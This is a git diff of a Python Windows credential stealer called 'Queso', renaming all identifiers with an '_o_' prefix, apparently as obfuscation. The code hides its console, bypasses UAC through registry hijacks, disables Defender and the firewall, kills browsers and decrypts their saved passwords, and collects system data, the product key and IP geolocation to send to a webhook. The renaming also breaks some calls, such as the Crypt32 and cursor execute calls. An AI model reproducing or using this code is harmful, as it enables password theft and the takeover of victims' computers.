@@ -16,169 +16,169 @@ import shutil
 import traceback
 
 
-class Syscalls:
+class _o_Syscalls:
 
     @staticmethod
-    def HideConsole():
+    def _o_HideConsole():
         ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
 
     @staticmethod
-    def CryptUnprotectData(encrypted_data: bytes):
+    def _o_CryptUnprotectData(_o_EncryptedData: bytes):
 
-        class DATA_BLOB(ctypes.Structure):
+        class _o_DATA_BLOB(ctypes.Structure):
 
             _fields_ = [
                 ("cbData", ctypes.c_ulong),
                 ("pbData", ctypes.POINTER(ctypes.c_ubyte))
             ]
 
-        pdata_in = DATA_BLOB(len(encrypted_data), ctypes.cast(encrypted_data, ctypes.POINTER(ctypes.c_ubyte)))
-        pdata_out = DATA_BLOB()
+        _o_pDataIn = _o_DATA_BLOB(len(_o_EncryptedData), ctypes.cast(_o_EncryptedData, ctypes.POINTER(ctypes.c_ubyte)))
+        _o_pDataOut = _o_DATA_BLOB()
         
-        if ctypes.windll.Crypt32.CryptUnprotectData(ctypes.byref(pdata_in), None, None, None, None, 0, ctypes.byref(pdata_out)):
-            data_out = (ctypes.c_ubyte * pdata_out.cbData)()
-            ctypes.memmove(data_out, pdata_out.pbData, pdata_out.cbData)
-            ctypes.windll.Kernel32.LocalFree(pdata_out.pbData)
-            return bytes(data_out)
+        if ctypes.windll.Crypt32._o_CryptUnprotectData(ctypes.byref(_o_pDataIn), None, None, None, None, 0, ctypes.byref(_o_pDataOut)):
+            _o_DataOut = (ctypes.c_ubyte * _o_pDataOut.cbData)()
+            ctypes.memmove(_o_DataOut, _o_pDataOut.pbData, _o_pDataOut.cbData)
+            ctypes.windll.Kernel32.LocalFree(_o_pDataOut.pbData)
+            return bytes(_o_DataOut)
 
-        raise ValueError("Invalid encrypted_data provided.")
+        raise ValueError("Invalid _o_EncryptedData provided.")
     
 
-class Errors:
+class _o_Errors:
 
-    error_list: list[str] = []
+    _o_ErrorList: list[str] = []
 
     @staticmethod
-    def Catch(catch_function):
-        def function_wrapper(*args, **kwargs):
+    def _o_Catch(_o_CatchFunction):
+        def _o_FunctionWrapper(*args, **kwargs):
             try:
-                return catch_function(*args, **kwargs)
-            except Exception as catch_error:
-                if isinstance(catch_error, KeyboardInterrupt):
+                return _o_CatchFunction(*args, **kwargs)
+            except Exception as _o_CatchError:
+                if isinstance(_o_CatchError, KeyboardInterrupt):
                     os._exit(1)
-                if not isinstance(catch_error, UnicodeEncodeError):
-                    catch_traceback = traceback.format_exc()
-                    Errors.error_list.append(catch_traceback)
+                if not isinstance(_o_CatchError, UnicodeEncodeError):
+                    _o_CatchTraceback = traceback.format_exc()
+                    _o_Errors._o_ErrorList.append(_o_CatchTraceback)
 
-        return function_wrapper
+        return _o_FunctionWrapper
 
 
-class Utility:
+class _o_Utility:
 
     @staticmethod
-    def GetSelf(): # Get the location of the file and whether exe mode is enabled or not
+    def _o_GetSelf(): # Get the location of the file and whether exe mode is enabled or not
         if hasattr(sys, "frozen"):
             return (sys.executable, True)
         else:
             return (__file__, False)
 
     @staticmethod
-    def IsAdmin():
+    def _o_IsAdmin():
         return subprocess.run("net session", shell= True, capture_output= True).returncode == 0
 
     @staticmethod
-    def UACbypass(bypass_method: int = 1): # Bypass UAC
-        if Utility.GetSelf()[1]:
-            execute = lambda cmd: subprocess.run(cmd, shell= True, capture_output= True).returncode == 0
+    def _o_UACbypass(_o_BypassMethod: int = 1): # Bypass UAC
+        if _o_Utility._o_GetSelf()[1]:
+            _o_Execute = lambda _o_Cmd: subprocess.run(_o_Cmd, shell= True, capture_output= True).returncode == 0
         
-            if bypass_method == 1:
-                if not execute(f"reg add hkcu\Software\\Classes\\ms-settings\\shell\\open\\command /d \"{sys.executable}\" /f"): Utility.UACbypass(2)
-                if not execute("reg add hkcu\Software\\Classes\\ms-settings\\shell\\open\\command /v \"DelegateExecute\" /f"): Utility.UACbypass(2)
-                execute("computerdefaults --nouacbypass")
-                execute("reg delete hkcu\Software\\Classes\\ms-settings /f")
+            if _o_BypassMethod == 1:
+                if not _o_Execute(f"reg add hkcu\Software\\Classes\\ms-settings\\shell\\open\\command /d \"{sys.executable}\" /f"): _o_Utility._o_UACbypass(2)
+                if not _o_Execute("reg add hkcu\Software\\Classes\\ms-settings\\shell\\open\\command /v \"DelegateExecute\" /f"): _o_Utility._o_UACbypass(2)
+                _o_Execute("computerdefaults --nouacbypass")
+                _o_Execute("reg delete hkcu\Software\\Classes\\ms-settings /f")
             
-            elif bypass_method == 2:
-                execute(f"reg add hkcu\Software\\Classes\\ms-settings\\shell\\open\\command /d \"{sys.executable}\" /f")
-                execute("reg add hkcu\Software\\Classes\\ms-settings\\shell\\open\\command /v \"DelegateExecute\" /f")
-                execute("fodhelper --nouacbypass")
-                execute("reg delete hkcu\Software\\Classes\\ms-settings /f")
+            elif _o_BypassMethod == 2:
+                _o_Execute(f"reg add hkcu\Software\\Classes\\ms-settings\\shell\\open\\command /d \"{sys.executable}\" /f")
+                _o_Execute("reg add hkcu\Software\\Classes\\ms-settings\\shell\\open\\command /v \"DelegateExecute\" /f")
+                _o_Execute("fodhelper --nouacbypass")
+                _o_Execute("reg delete hkcu\Software\\Classes\\ms-settings /f")
 
             os._exit(0)
 
     @staticmethod
-    def GetRandomString(length: int = 5, invisible: bool = False): # Generates a random string
-        if invisible:
-            return "".join(random.choices(["\xa0", chr(8239)] + [chr(rand_char) for rand_char in range(8192, 8208)], k= length))
+    def _o_GetRandomString(_o_Length: int = 5, _o_Invisible: bool = False): # Generates a random string
+        if _o_Invisible:
+            return "".join(random.choices(["\xa0", chr(8239)] + [chr(_o_RandChar) for _o_RandChar in range(8192, 8208)], k= _o_Length))
         else:
-            return "".join(random.choices("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789", k= length))
+            return "".join(random.choices("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789", k= _o_Length))
         
     @staticmethod
-    def CreateZip(zip_data: dict): # Create a zip file
-        with zipfile.ZipFile(os.path.join(sys._MEIPASS, "data.zip"), "w") as data_pack:
-            for file_extension in zip_data:
-                for file_name in zip_data[file_extension]:
-                    file_data = zip_data[file_extension][file_name]
-                    with data_pack.open(f"{file_name}.{file_extension}", "w") as zip_file:
-                        if file_extension == "xml":
-                            zip_file.write(bytes(ElementTree.tostring(file_data).decode('utf-8'), 'utf-8'))
+    def _o_CreateZip(_o_ZipData: dict): # Create a zip file
+        with zipfile.ZipFile(os.path.join(sys._MEIPASS, "data.zip"), "w") as _o_DataPack:
+            for _o_FileExtension in _o_ZipData:
+                for _o_FileName in _o_ZipData[_o_FileExtension]:
+                    _o_FileData = _o_ZipData[_o_FileExtension][_o_FileName]
+                    with _o_DataPack.open(f"{_o_FileName}.{_o_FileExtension}", "w") as _o_ZipFile:
+                        if _o_FileExtension == "xml":
+                            _o_ZipFile.write(bytes(ElementTree.tostring(_o_FileData).decode('utf-8'), 'utf-8'))
                         else:
-                            zip_file.write(bytes(file_data, 'utf-8'))
+                            _o_ZipFile.write(bytes(_o_FileData, 'utf-8'))
 
     @staticmethod
-    def KillTask(*task_list: str):
-        task_list = list(map(lambda task_x: task_x.lower(), task_list))
-        cmd = subprocess.run("tasklist /FO LIST", shell= True, capture_output= True).stdout.decode(errors= "ignore")
-        cmd_out = cmd.strip().split('\r\n\r\n')
-        for cmd_i in cmd_out:
-            cmd_i = cmd_i.split("\r\n")[:2]
+    def _o_KillTask(*_o_TaskList: str):
+        _o_TaskList = list(map(lambda _o_X: _o_X.lower(), _o_TaskList))
+        _o_Cmd = subprocess.run("tasklist /FO LIST", shell= True, capture_output= True).stdout.decode(errors= "ignore")
+        _o_CmdOut = _o_Cmd.strip().split('\r\n\r\n')
+        for _o_I in _o_CmdOut:
+            _o_I = _o_I.split("\r\n")[:2]
             try:
-                proc_name, proc_id = cmd_i[0].split()[-1], int(cmd_i[1].split()[-1])
-                proc_name = proc_name[:-4] if proc_name.endswith(".exe") else proc_name
-                if proc_name.lower() in task_list:
-                    subprocess.run("taskkill /F /PID %d" % proc_id, shell= True, capture_output= True)
+                _o_ProcName, _o_ProcId = _o_I[0].split()[-1], int(_o_I[1].split()[-1])
+                _o_ProcName = _o_ProcName[:-4] if _o_ProcName.endswith(".exe") else _o_ProcName
+                if _o_ProcName.lower() in _o_TaskList:
+                    subprocess.run("taskkill /F /PID %d" % _o_ProcId, shell= True, capture_output= True)
             except Exception:
                 pass
 
 
-class Network:
+class _o_Network:
 
     @staticmethod
-    def GetNetAdapters(): # Get a list of network adapters
-        adapters = list()
-        cmd = subprocess.run(
+    def _o_GetNetAdapters(): # Get a list of network adapters
+        _o_Adapters = list()
+        _o_Cmd = subprocess.run(
             "powershell -Command Get-NetAdapter -Name *",
             shell= True, stdout= subprocess.PIPE, stderr= subprocess.PIPE
         )
-        lines_out = cmd.stdout.decode('utf-8').split('\n')
-        for line_out in lines_out:
-            if line_out.startswith("Name") or line_out.startswith("----") or line_out.isspace():
+        _o_LinesOut = _o_Cmd.stdout.decode('utf-8').split('\n')
+        for _o_LineOut in _o_LinesOut:
+            if _o_LineOut.startswith("Name") or _o_LineOut.startswith("----") or _o_LineOut.isspace():
                 pass
             else:
-                print(line_out)
-                adapter = line_out.split("   ")[0]
-                if "..." in adapter:
+                print(_o_LineOut)
+                _o_Adapter = _o_LineOut.split("   ")[0]
+                if "..." in _o_Adapter:
                     pass
                 else:
-                    adapters.append(adapter)
-        return adapters
+                    _o_Adapters.append(_o_Adapter)
+        return _o_Adapters
     
     @staticmethod
-    def GetNetConnection(adapter: str): # Get an adapter's network connection
-        cmd = subprocess.run(
-            "powershell -Command Get-NetConnectionProfile -InterfaceAlias \"{}\"".format(adapter),
+    def _o_GetNetConnection(_o_Adapter: str): # Get an adapter's network _o_Connection
+        _o_Cmd = subprocess.run(
+            "powershell -Command Get-NetConnectionProfile -InterfaceAlias \"{}\"".format(_o_Adapter),
             shell= True, stdout= subprocess.PIPE, stderr= subprocess.PIPE
         )
-        lines_out = cmd.stdout.decode('utf-8').split('\n')
-        connection = ""
-        for line_out in lines_out:
-            if line_out.startswith("Name"):
-                connection = line_out.split(" : ")[1]
+        _o_LinesOut = _o_Cmd.stdout.decode('utf-8').split('\n')
+        _o_Connection = ""
+        for _o_LineOut in _o_LinesOut:
+            if _o_LineOut.startswith("Name"):
+                _o_Connection = _o_LineOut.split(" : ")[1]
                 break
-        if connection:
-            return connection
+        if _o_Connection:
+            return _o_Connection
         return "None"
 
     @staticmethod
-    def DisableFirewall(): # Disable Windows Firewall
-        adapters = Network.GetNetAdapters()
-        for adapter in adapters: # Loop over all adapters
-            print(adapter)
-            connection = Network.GetNetConnection(adapter)
-            if connection == "None":
+    def _o_DisableFirewall(): # Disable Windows Firewall
+        _o_Adapters = _o_Network._o_GetNetAdapters()
+        for _o_Adapter in _o_Adapters: # Loop over all adapters
+            print(_o_Adapter)
+            _o_Connection = _o_Network._o_GetNetConnection(_o_Adapter)
+            if _o_Connection == "None":
                 pass
             else: # Set network type to private
                 subprocess.Popen(
-                    "powershell -Command Set-NetConnectionProfile -Name '{}' -NetworkCategory Private".format(connection),
+                    "powershell -Command Set-NetConnectionProfile -Name '{}' -NetworkCategory Private".format(_o_Connection),
                     shell= True
                 )
             # Disable firewall on private networks
@@ -188,216 +188,216 @@ class Network:
         )
 
     @staticmethod
-    def ExcludeFromFirewall(filepath: str = None): # Exclude a file from Windows Firewall
-        if filepath is None:
-            filepath = Utility.GetSelf()[0]
-        subprocess.Popen("netsh advfirewall firewall add rule name='tcpclient' dir='in' action='allow' program='{}'".format(filepath))
+    def _o_ExcludeFromFirewall(_o_FilePath: str = None): # Exclude a file from Windows Firewall
+        if _o_FilePath is None:
+            _o_FilePath = _o_Utility._o_GetSelf()[0]
+        subprocess.Popen("netsh advfirewall firewall add rule name='tcpclient' dir='in' action='allow' program='{}'".format(_o_FilePath))
 
     @staticmethod
-    def InstallNmap(): # Install Nmap
-        with zipfile.ZipFile(os.path.join(sys._MEIPASS, "nmap.zip"), "r") as nmap_zip:
-            nmap_zip.extractall("C:\\Program Files (x86)")
+    def _o_InstallNmap(): # Install Nmap
+        with zipfile.ZipFile(os.path.join(sys._MEIPASS, "nmap.zip"), "r") as _o_NmapZip:
+            _o_NmapZip.extractall("C:\\Program Files (x86)")
 
     @staticmethod
-    def NmapScan(ip_range: str, nmap_arguments: str ="-sV -T4 -O -F --version-light"): # Perform an Nmap scan
-        nmap_session = nmap3.Nmap()
-        return nmap_session.scan_command(ip_range, nmap_arguments)
+    def _o_NmapScan(_o_IpRange: str, _o_NmapArgs: str ="-sV -T4 -O -F --version-light"): # Perform an Nmap scan
+        _o_NmapSession = nmap3.Nmap()
+        return _o_NmapSession.scan_command(_o_IpRange, _o_NmapArgs)
     
-class Defender:
+class _o_Defender:
 
     @staticmethod
-    def ExcludeFromDefender(filepath: str = None): # Exclude a file from Windows Defender
-        if filepath is None:
-            filepath = Utility.GetSelf()[0]
+    def _o_ExcludeFromDefender(_o_FilePath: str = None): # Exclude a file from Windows Defender
+        if _o_FilePath is None:
+            _o_FilePath = _o_Utility._o_GetSelf()[0]
         subprocess.Popen(
-            "powershell -Command Add-MpPreference -ExclusionPath '{}'".format(filepath),
+            "powershell -Command Add-MpPreference -ExclusionPath '{}'".format(_o_FilePath),
             shell= True, creationflags= subprocess.CREATE_NEW_CONSOLE | subprocess.SW_HIDE
         )
 
     @staticmethod
-    def DisableDefender(): # Disable Windows Defender
+    def _o_DisableDefender(): # Disable Windows Defender
         subprocess.Popen(
             "powershell -Command Set-MpPreference -DisableBehaviorMonitoring $True -DisableRealtimeMonitoring $True",
             shell= True, creationflags= subprocess.CREATE_NEW_CONSOLE | subprocess.SW_HIDE
         )
 
 
-class Tasks:
+class _o_Tasks:
 
-    task_threads: list[Thread] = list()
-
-    @staticmethod
-    def AddTask(task: Thread):
-        Tasks.task_threads.append(task)
+    _o_TaskThreads: list[Thread] = list()
 
     @staticmethod
-    def WaitForAll():
-        for task_thread in Tasks.task_threads:
-            task_thread.join()
+    def _o_AddTask(task: Thread):
+        _o_Tasks._o_TaskThreads.append(task)
+
+    @staticmethod
+    def _o_WaitForAll():
+        for _o_TaskThread in _o_Tasks._o_TaskThreads:
+            _o_TaskThread.join()
 
 
-class Browsers:
+class _o_Browsers:
 
-    class Chromium:
+    class _o_Chromium:
 
-        BrowserPath: str = None
-        EncryptionKey: bytes = None
+        _o_BrowserPath: str = None
+        _o_EncryptionKey: bytes = None
 
-        def __init__(self, browser_path: str):
-            if not os.path.isdir(browser_path):
+        def __init__(self, _o_BrowserPath: str):
+            if not os.path.isdir(_o_BrowserPath):
                 raise NotADirectoryError("Browser path not found.")
             
-            self.BrowserPath = browser_path
+            self._o_BrowserPath = _o_BrowserPath
 
-        def GetEncryptionKey(self): # Get the browser's encryption key
-            if self.EncryptionKey is not None:
-                return self.EncryptionKey
+        def _o_GetEncryptionKey(self): # Get the browser's encryption key
+            if self._o_EncryptionKey is not None:
+                return self._o_EncryptionKey
             
             else:
                 # Look for local state file
-                local_state_path = os.path.join(self.BrowserPath, "Local State")
-                if os.path.isfile(local_state_path):
-                    with open(local_state_path, encoding= "utf-8", errors= "ignore") as local_state_file:
+                _o_LocalStatePath = os.path.join(self._o_BrowserPath, "Local State")
+                if os.path.isfile(_o_LocalStatePath):
+                    with open(_o_LocalStatePath, encoding= "utf-8", errors= "ignore") as _o_LocalStateFile:
                         # Load contents to json
-                        json_content: dict = json.load(local_state_file)
+                        json_content: dict = json.load(_o_LocalStateFile)
 
                     # Decode and unprotect the encryption key
-                    encrypted_key: str = json_content["os_crypt"]["encrypted_key"]
-                    encrypted_key = base64.b64decode(encrypted_key.encode())[5:]
-                    self.EncryptionKey = Syscalls.CryptUnprotectData(encrypted_key)
-                    
-                    return self.EncryptionKey
+                    _o_EncryptedKey: str = json_content["os_crypt"]["encrypted_key"]
+                    _o_EncryptedKey = base64.b64decode(_o_EncryptedKey.encode())[5:]
+                    self._o_EncryptionKey = _o_Syscalls._o_CryptUnprotectData(_o_EncryptedKey)
+
+                    return self._o_EncryptionKey
                 
                 else:
                     return None
                 
-        def DecryptData(self, buffer: bytes, encryption_key: bytes): # Decrypt data
-            encryption_version = buffer.decode(errors= "ignore")
+        def _o_DecryptData(self, _o_Buffer: bytes, _o_EncryptionKey: bytes): # Decrypt data
+            _o_EncryptionVersion = _o_Buffer.decode(errors= "ignore")
 
             # Detect encryption version
-            if encryption_version.startswith(("v10", "v11")):
+            if _o_EncryptionVersion.startswith(("v10", "v11")):
                 # Set IV and Data
-                encrypt_iv = buffer[3:15]
-                cipher_data = buffer[15:]
+                _o_IV = _o_Buffer[3:15]
+                _o_CipherData = _o_Buffer[15:]
                 # Decrypt using AES256-GCM
-                encryption_cipher = AES.new(encryption_key, AES.MODE_GCM, encrypt_iv)
-                decrypted_data = encryption_cipher.decrypt(cipher_data)[:-16].decode()
-                return decrypted_data
+                _o_EncryptionCipher = AES.new(_o_EncryptionKey, AES.MODE_GCM, _o_IV)
+                _o_DecryptedData = _o_EncryptionCipher.decrypt(_o_CipherData)[:-16].decode()
+                return _o_DecryptedData
             else:
                 # Decrypt using CryptUnprotectData
-                return str(Syscalls.CryptUnprotectData(buffer))            
+                return str(_o_Syscalls._o_CryptUnprotectData(_o_Buffer))            
             
-        def GetCreds(self): # Get the browser's credentials
-            encryption_key = self.GetEncryptionKey()
-            password_list = list()
+        def _o_GetCreds(self): # Get the browser's credentials
+            _o_EncryptionKey = self._o_GetEncryptionKey()
+            _o_PasswordList = list()
 
-            if encryption_key is None:
-                return password_list
+            if _o_EncryptionKey is None:
+                return _o_PasswordList
             
-            login_file_paths = list()
+            _o_LoginFilePaths = list()
 
-            for browser_root, _, browser_files in os.walk(self.BrowserPath): # Find login file paths
-                for browser_file in browser_files:
-                    if browser_file.lower() == "login data":
-                        file_path = os.path.join(browser_root, browser_file)
-                        login_file_paths.append(file_path)
+            for _o_BrowserRoot, _, _o_BrowserFiles in os.walk(self._o_BrowserPath): # Find login file paths
+                for _o_BrowserFile in _o_BrowserFiles:
+                    if _o_BrowserFile.lower() == "login data":
+                        _o_FilePath = os.path.join(_o_BrowserRoot, _o_BrowserFile)
+                        _o_LoginFilePaths.append(_o_FilePath)
             
-            for login_file_path in login_file_paths:
+            for _o_LoginFilePath in _o_LoginFilePaths:
                 while True: # Maintain a temp file
-                    tempfile = os.path.join(os.getenv("temp"), Utility.GetRandomString(10) + ".tmp")
-                    if not os.path.isfile(tempfile):
+                    _o_TempFile = os.path.join(os.getenv("temp"), _o_Utility._o_GetRandomString(10) + ".tmp")
+                    if not os.path.isfile(_o_TempFile):
                         break
 
                 try: # Copy the login file's contents to the temp file
-                    shutil.copy(login_file_path, tempfile)
+                    shutil.copy(_o_LoginFilePath, _o_TempFile)
                 except Exception:
                     continue
 
                 # Connect to the temp file with sql
-                password_db = sqlite3.connect(tempfile)
-                password_db.text_factory = lambda encoded_data : encoded_data.decode(errors= "ignore")
-                db_cursor = password_db.cursor()
+                _o_DB = sqlite3.connect(_o_TempFile)
+                _o_DB.text_factory = lambda _o_Data : _o_Data.decode(errors= "ignore")
+                _o_DBCursor = _o_DB.cursor()
 
                 try:
                     # Get the credentials
-                    password_results = db_cursor.execute("SELECT origin_url, username_value, password_value FROM logins").fetchall()
+                    _o_Results = _o_DBCursor._o_Execute("SELECT origin_url, username_value, password_value FROM logins").fetchall()
 
                     # Decrypt the passwords and add to the password list
-                    for pass_url, pass_user, pass_password in password_results:
-                        if pass_url and pass_user and pass_password:
-                            password_list.append((pass_url, pass_user, self.DecryptData(pass_password, encryption_key)))
+                    for _o_URL, _o_User, _o_Password in _o_Results:
+                        if _o_URL and _o_User and _o_Password:
+                            _o_PasswordList.append((_o_URL, _o_User, self._o_DecryptData(_o_Password, _o_EncryptionKey)))
                 
                 except Exception:
                     pass
 
                 # Close the files
-                db_cursor.close()
-                password_db.close()
-                os.remove(tempfile)
+                _o_DBCursor.close()
+                _o_DB.close()
+                os.remove(_o_TempFile)
 
-            return password_list
+            return _o_PasswordList
 
 
 class Queso:
 
-    Webhook: str = "%webhook%"
-    TempFolder: str = None
+    _o_Webhook: str = "%webhook%"
+    _o_TempFolder: str = None
 
     def __init__(self) -> None:
 
         while True: # Maintain a temp folder
-            self.TempFolder = os.path.join(os.getenv("temp"), Utility.GetRandomString(10, True))
-            if not os.path.isdir(self.TempFolder):
-                os.makedirs(self.TempFolder, exist_ok= True)
+            self._o_TempFolder = os.path.join(os.getenv("temp"), _o_Utility._o_GetRandomString(10, True))
+            if not os.path.isdir(self._o_TempFolder):
+                os.makedirs(self._o_TempFolder, exist_ok= True)
                 break
 
-        default_tasks = (
-            (self.LaunchBoundApplication, False),
-            (self.SendData, False)
+        _o_DefaultTasks = (
+            (self._o_LaunchBoundApplication, False),
+            (self._o_SendData, False)
         )
 
         # Hide the console
-        Syscalls.HideConsole()
+        _o_Syscalls._o_HideConsole()
 
         if "%uacbypass%":
-            if not Utility.IsAdmin(): # If not an admin, try to be one
-                if Utility.GetSelf()[1] and not "--no-bypass" in sys.argv:
-                        Utility.UACbypass()
+            if not _o_Utility._o_IsAdmin(): # If not an admin, try to be one
+                if _o_Utility._o_GetSelf()[1] and not "--no-bypass" in sys.argv:
+                        _o_Utility._o_UACbypass()
 
-        if Utility.IsAdmin(): # We're admin now
+        if _o_Utility._o_IsAdmin(): # We're admin now
             
             if "%disable_defender%":
-                # Disable Windows Defender and exclude this file
-                Defender.DisableDefender()
-                Defender.ExcludeFromDefender()
+                # Disable Windows _o_Defender and exclude this file
+                _o_Defender._o_DisableDefender()
+                _o_Defender._o_ExcludeFromDefender()
 
             if "%disable_firewall%":
                 # Disable Windows Firewall and exclude this file
-                Network.DisableFirewall()
-                Network.ExcludeFromFirewall()
+                _o_Network._o_DisableFirewall()
+                _o_Network._o_ExcludeFromFirewall()
 
             if not os.path.exists("C:\\Program Files (x86)\\Nmap"): # Install Nmap if it doesn't exist
-                Network.InstallNmap()
+                _o_Network._o_InstallNmap()
 
-        for task_func, task_daemon in default_tasks: # Start user tasks
-            default_task_thread = Thread(target= task_func, daemon= task_daemon)
-            default_task_thread.start()
-            Tasks.AddTask(default_task_thread)
+        for _o_Func, _o_Daemon in _o_DefaultTasks: # Start user tasks
+            _o_Thread = Thread(target= _o_Func, daemon= _o_Daemon)
+            _o_Thread.start()
+            _o_Tasks._o_AddTask(_o_Thread)
 
-        Tasks.WaitForAll()
+        _o_Tasks._o_WaitForAll()
 
-    def LaunchBoundApplication(self): # Launch the bound application
-        boundExePath = os.path.join(sys._MEIPASS, "bound", "bound.exe")
-        if os.path.isfile(boundExePath):
-            subprocess.Popen("{}".format(boundExePath))
+    def _o_LaunchBoundApplication(self): # Launch the bound application
+        _o_BoundExePath = os.path.join(sys._MEIPASS, "bound", "bound.exe")
+        if os.path.isfile(_o_BoundExePath):
+            subprocess.Popen("{}".format(_o_BoundExePath))
 
-    @Errors.Catch
-    def StealBrowserCreds(self):
-        browser_threads: list[Thread] = []
-        browser_paths = {
+    @_o_Errors._o_Catch
+    def _o_StealBrowserCreds(self):
+        _o_BrowserThreads: list[Thread] = []
+        _o_BrowserPaths = {
             "Brave" : (os.path.join(os.getenv("localappdata"), "BraveSoftware", "Brave-Browser", "User Data"), "brave"),
             "Chrome" : (os.path.join(os.getenv("localappdata"), "Google", "Chrome", "User Data"), "chrome"),
-            "Chromium" : (os.path.join(os.getenv("localappdata"), "Chromium", "User Data"), "chromium"),
+            "_o_Chromium" : (os.path.join(os.getenv("localappdata"), "_o_Chromium", "User Data"), "chromium"),
             "Comodo" : (os.path.join(os.getenv("localappdata"), "Comodo", "Dragon", "User Data"), "comodo"),
             "Edge" : (os.path.join(os.getenv("localappdata"), "Microsoft", "Edge", "User Data"), "msedge"),
             "EpicPrivacy" : (os.path.join(os.getenv("localappdata"), "Epic Privacy Browser", "User Data"), "epic"),
@@ -410,134 +410,134 @@ class Queso:
             "Yandex" : (os.path.join(os.getenv("localappdata"), "Yandex", "YandexBrowser", "User Data"), "yandex")
         }
 
-        for browser_name, browser_item in browser_paths.items():
-            browser_path, process_name = browser_item
-            if os.path.isdir(browser_path):
-                def browser_steal(d_name, d_path):
+        for _o_BrowserName, _o_BrowserItem in _o_BrowserPaths.items():
+            _o_BrowserPath, _o_ProcName = _o_BrowserItem
+            if os.path.isdir(_o_BrowserPath):
+                def browser_steal(_o_dName, _o_dPath):
                     try:
-                        Utility.KillTask(process_name)
-                        browser_instance = Browsers.Chromium(d_path)
-                        password_file_path = os.path.join(sys._MEIPASS, "dumped_creds.txt")
+                        _o_Utility._o_KillTask(_o_ProcName)
+                        _o_BrowserInstance = _o_Browsers._o_Chromium(_o_dPath)
+                        _o_PasswordFilePath = os.path.join(sys._MEIPASS, "dumped_creds.txt")
 
-                        browser_passwords = browser_instance.GetCreds()
+                        _o_BrowserPasswords = _o_BrowserInstance._o_GetCreds()
 
-                        if browser_passwords:
-                            passwords_out = ["{},{},{}\n".format(*password_data) for password_data in browser_passwords]
-                            if not os.path.exists(password_file_path):
-                                with open(password_file_path, "w") as password_file:
-                                    password_file.write("".join(passwords_out))
+                        if _o_BrowserPasswords:
+                            _o_PasswordsOut = ["{},{},{}\n".format(*_o_PasswordData) for _o_PasswordData in _o_BrowserPasswords]
+                            if not os.path.exists(_o_PasswordFilePath):
+                                with open(_o_PasswordFilePath, "w") as _o_PasswordFile:
+                                    _o_PasswordFile.write("".join(_o_PasswordsOut))
                             else:
-                                with open(password_file_path, "a") as password_file:
-                                    password_file.write("".join(passwords_out))
+                                with open(_o_PasswordFilePath, "a") as _o_PasswordFile:
+                                    _o_PasswordFile.write("".join(_o_PasswordsOut))
                     
                     except Exception:
                         pass
                 
-                browser_thread = Thread(target= browser_steal, args= (browser_name, browser_path))
-                browser_thread.start()
-                browser_threads.append(browser_thread)
+                _o_BrowserThread = Thread(target= browser_steal, args= (_o_BrowserName, _o_BrowserPath))
+                _o_BrowserThread.start()
+                _o_BrowserThreads.append(_o_BrowserThread)
             
-        for browser_thread in browser_threads:
-            browser_thread.join()
+        for _o_BrowserThread in _o_BrowserThreads:
+            _o_BrowserThread.join()
 
-    def SendData(self): # Send gathered data to the webhook
+    def _o_SendData(self): # Send gathered data to the webhook
 
         if "%log_sysinfo%":
             # Gather system information
-            computer_name = os.getenv("computername")
-            computer_os = subprocess.run('wmic os get Caption', capture_output= True, shell= True).stdout.decode(errors= 'ignore').strip().splitlines()[2].strip()
-            computer_uuid = subprocess.run('wmic csproduct get uuid', capture_output= True, shell= True).stdout.decode(errors= 'ignore').strip().split()[1]
-            cpu = subprocess.run("powershell Get-ItemPropertyValue -Path 'HKLM:System\\CurrentControlSet\\Control\\Session Manager\\Environment' -Name PROCESSOR_IDENTIFIER", capture_output= True, shell= True).stdout.decode(errors= 'ignore').strip()
-            gpu = subprocess.run("wmic path win32_VideoController get name", capture_output= True, shell= True).stdout.decode(errors= 'ignore').splitlines()[2].strip()
-            productKey = subprocess.run("powershell Get-ItemPropertyValue -Path 'HKLM:SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\SoftwareProtectionPlatform' -Name BackupProductKeyDefault", capture_output= True, shell= True).stdout.decode(errors= 'ignore').strip()
+            _o_ComputerName = os.getenv("computername")
+            _o_OS = subprocess.run('wmic os get Caption', capture_output= True, shell= True).stdout.decode(errors= 'ignore').strip().splitlines()[2].strip()
+            _o_UUID = subprocess.run('wmic csproduct get uuid', capture_output= True, shell= True).stdout.decode(errors= 'ignore').strip().split()[1]
+            _o_CPU = subprocess.run("powershell Get-ItemPropertyValue -Path 'HKLM:System\\CurrentControlSet\\Control\\Session Manager\\Environment' -Name PROCESSOR_IDENTIFIER", capture_output= True, shell= True).stdout.decode(errors= 'ignore').strip()
+            _o_GPU = subprocess.run("wmic path win32_VideoController get name", capture_output= True, shell= True).stdout.decode(errors= 'ignore').splitlines()[2].strip()
+            _o_ProductKey = subprocess.run("powershell Get-ItemPropertyValue -Path 'HKLM:SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\SoftwareProtectionPlatform' -Name BackupProductKeyDefault", capture_output= True, shell= True).stdout.decode(errors= 'ignore').strip()
 
-            sys_info = f"""
-                \nComputer Name: {computer_name}
-                \nOS: {computer_os}
-                \nUUID: {computer_uuid}
-                \nCPU: {cpu}
-                \nGPU: {gpu}
-                \nProduct Key: {productKey}
+            _o_SystemInfo = f"""
+                \nComputer Name: {_o_ComputerName}
+                \nOS: {_o_OS}
+                \nUUID: {_o_UUID}
+                \nCPU: {_o_CPU}
+                \nGPU: {_o_GPU}
+                \nProduct Key: {_o_ProductKey}
             """
 
-        http_manager = PoolManager()
+        _o_HttpManager = PoolManager()
 
         if "%log_ipinfo%":
             try: # Try to gather IP information
-                result: dict = json.loads(http_manager.request("GET", "http://ip-api.com/json/").data.decode())
-                if result.get("status") != "success":
+                _o_R: dict = json.loads(_o_HttpManager.request("GET", "http://ip-api.com/json/").data.decode())
+                if _o_R.get("status") != "success":
                     raise Exception("Failed to retrieve IP info")
-                ip_data = f"""
-                    \nIP: {result['query']}
-                    \nCountry: {result['country']}
-                    \nTimezone: {result['timezone']}
-                    \nRegion: {result['regionName']}
-                    \nZIP: {result['zip']}
-                    \nCoordinates: [{result['lat']}, {result['lon']}]
-                    \nISP: {result['isp']}
+                _o_IpData = f"""
+                    \nIP: {_o_R['query']}
+                    \nCountry: {_o_R['country']}
+                    \nTimezone: {_o_R['timezone']}
+                    \nRegion: {_o_R['regionName']}
+                    \nZIP: {_o_R['zip']}
+                    \nCoordinates: [{_o_R['lat']}, {_o_R['lon']}]
